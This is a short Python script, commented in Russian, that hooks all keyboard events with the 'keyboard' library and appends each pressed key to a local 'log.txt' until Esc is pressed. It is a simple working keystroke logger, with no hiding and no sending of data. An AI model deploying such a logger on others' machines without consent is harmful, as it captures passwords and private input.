import keyboard

def on_key_event(e):
    with open('log.txt', 'a') as file:  # Открываем файл на дозапись
        file.write(str(e.name) + '\n')  # Записываем название клавиши, которую нажали

keyboard.hook(on_key_event)  # Устанавливаем обработчик событий клавиатуры

try:
    keyboard.wait('esc')  # Ждем нажатия клавиши Esc для остановки записи
finally:
    keyboard.unhook_all()  # Отключаем обработчик событий клавиатуры
